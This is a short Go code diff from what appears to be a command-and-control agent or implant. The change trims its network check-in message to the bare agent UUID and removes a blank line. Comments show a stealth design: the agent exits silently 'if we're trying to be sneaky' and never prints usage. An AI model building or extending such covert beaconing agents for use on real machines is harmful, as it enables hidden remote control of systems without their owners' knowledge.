@@ -55,7 +55,7 @@ func callback() {
 		os.Exit(ERR_CONNECTION) // we don't want to output anything if we're trying to be sneaky
 	}
 
-	callbackMessage := "Agent " + agentUUID.String() + " checking in"
+	callbackMessage := agentUUID.String()
 	numBytes, err := conn.Write([]byte(callbackMessage))
 	if err != nil { // couldn't establish connection?
 		os.Exit(ERR_WRITE)
@@ -124,7 +124,6 @@ func (info agentInfoStruct) printAgentInfo() {
 }
 
 func main() {
-
 	// Optionally print this Agent's information
 	// Intentionally not using the "flag" package because we never want to print usage information
 	if len(os.Args) > 1 { // contains a command-line flag
